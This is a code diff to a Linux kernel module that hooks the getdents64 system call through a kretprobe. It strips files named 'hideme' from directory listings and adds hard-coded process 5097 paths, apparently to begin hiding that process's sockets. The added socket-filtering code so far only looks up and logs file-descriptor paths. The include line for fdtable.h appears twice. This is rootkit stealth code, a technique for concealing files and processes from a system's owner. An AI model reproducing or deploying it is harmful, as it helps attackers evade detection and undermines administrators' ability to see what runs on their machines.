@@ -8,9 +8,13 @@
 #include <linux/fprobe.h>
 #include <linux/dirent.h>
 #include <linux/string.h>
+#include <linux/fdtable.h>
+#include <linux/fdtable.h>
 
 /// const file name to hide
 const char* hide_file_name = "hideme";
+const char* hide_pid = "5097";
+const char* hide_pid_path = "/proc/5097/fd";
 
 typedef bool (*entry_filter_t)(struct linux_dirent64*);
 
@@ -64,8 +68,29 @@ static int handle_post(struct kretprobe_instance *ri, struct pt_regs *regs)
     struct getdent64_arguments* args = (struct getdent64_arguments*) ri->data;
     unsigned long retval = regs_return_value(regs);
 
+    // filter by name
     unsigned int new_size = hide_entry(args->buffer_ptr, retval, hide_entry_by_name);
     regs_set_return_value(regs, new_size);
+
+    // filter socket
+    char fd_path[256];
+    char mount_path[256];
+    struct file* file = files_lookup_fd_raw(current->files, args->fd);
+    struct dentry* dentry = file->f_path.dentry;
+    char* path = dentry_path_raw(dentry, fd_path, 256);
+
+    struct dentry* mnt = file->f_path.mnt->mnt_root;
+    char* mnt_path = dentry_path_raw(mnt, mount_path, 256);
+
+    if(strcmp(path, hide_pid_path) == 0){
+        pr_info("found usage in path=%s\n", path);
+    }
+    if(retval == 144){
+        pr_info("path=%s, mnt=%s\n", path, mnt_path);
+    }
+
+
+
     return 0;
 }
 
